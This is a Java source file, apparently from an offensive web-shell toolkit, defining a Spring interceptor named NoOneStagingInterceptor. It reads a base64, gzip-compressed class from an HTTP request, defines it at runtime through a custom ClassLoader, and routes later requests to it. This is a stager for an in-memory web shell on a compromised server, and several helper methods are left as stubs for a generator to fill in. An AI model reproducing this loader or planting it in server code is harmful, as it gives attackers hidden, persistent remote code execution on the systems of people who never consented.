package com.reajason.noone.core.shelltool;

import org.springframework.web.servlet.AsyncHandlerInterceptor;
import org.springframework.web.servlet.ModelAndView;

import javax.servlet.ServletOutputStream;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.*;
import java.util.zip.GZIPInputStream;

/**
 * @author ReaJason
 * @since 2026/3/15
 */
public class NoOneStagingInterceptor extends ClassLoader implements AsyncHandlerInterceptor {

    private static volatile Class<?> adaptorClass = null;

    public NoOneStagingInterceptor() {
    }

    public NoOneStagingInterceptor(ClassLoader parent) {
        super(parent);
    }

    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        try {
            if (adaptorClass != null) {
                if (adaptorClass.newInstance().equals(new Object[]{request, response})) {
                    return false;
                }
            }
            if (isAuthed(request)) {
                ServletOutputStream responseOutputStream = response.getOutputStream();
                try {
                    if (adaptorClass == null) {
                        synchronized (NoOneStagingInterceptor.class) {
                            if (adaptorClass == null) {
                                byte[] payload = transformReqPayload(getArgFromRequest(request));
                                byte[] bytes = gzipDecompress(decodeBase64(new String(payload, "UTF-8")));
                                adaptorClass = new NoOneStagingInterceptor(Thread.currentThread().getContextClassLoader())
                                        .defineClass(bytes, 0, bytes.length);
                            }
                        }
                    }
                    byte[] data = wrapResData(transformResData("ok".getBytes("UTF-8")));
                    responseOutputStream.write(data);
                } catch (Throwable e) {
                    responseOutputStream.write(getStackTraceAsString(e).getBytes("UTF-8"));
                }
                wrapResponse(response);
                responseOutputStream.flush();
                responseOutputStream.close();
                return false;
            }
        } catch (Throwable ignored) {
        }
        return true;
    }

    private boolean isAuthed(Object request) {
        return true;
    }

    private byte[] getArgFromRequest(Object request) {
        return new byte[0];
    }

    private byte[] transformReqPayload(byte[] input) {
        return input;
    }

    private byte[] wrapResData(byte[] payload) {
        return payload;
    }

    private byte[] transformResData(byte[] payload) {
        return payload;
    }

    private void wrapResponse(Object response) {
    }

    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Throwable e) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } finally {
            if (gzipInputStream != null) {
                gzipInputStream.close();
            }
            out.close();
        }
    }

    private String getStackTraceAsString(Throwable throwable) {
        StringWriter sw = new StringWriter();
        PrintWriter pw = new PrintWriter(sw);
        throwable.printStackTrace(pw);
        return sw.toString();
    }

    @Override
    public void afterConcurrentHandlingStarted(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {

    }

    @Override
    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {

    }

    @Override
    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {

    }
}
